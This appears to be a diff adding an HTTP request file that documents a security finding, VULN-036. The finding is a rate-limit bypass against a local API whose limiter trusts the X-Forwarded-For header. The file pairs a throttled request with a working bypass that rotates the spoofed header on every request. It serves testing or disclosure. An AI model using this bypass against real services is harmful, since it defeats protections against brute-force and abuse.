@@ -1,0 +1,12 @@
+### VULN-036 — Rate-limit bypass via spoofable X-Forwarded-For
+### The API is published directly; the limiter keys on client headers.
+
+### Throttled (single bucket) — after ~100 requests returns 429:
+GET http://localhost:21527/ HTTP/1.1
+Host: localhost:21527
+X-Forwarded-For: 203.0.113.7
+
+### Bypassed — rotate the header every request, each lands in a fresh bucket, never 429:
+GET http://localhost:21527/ HTTP/1.1
+Host: localhost:21527
+X-Forwarded-For: 198.51.100.<incrementing>
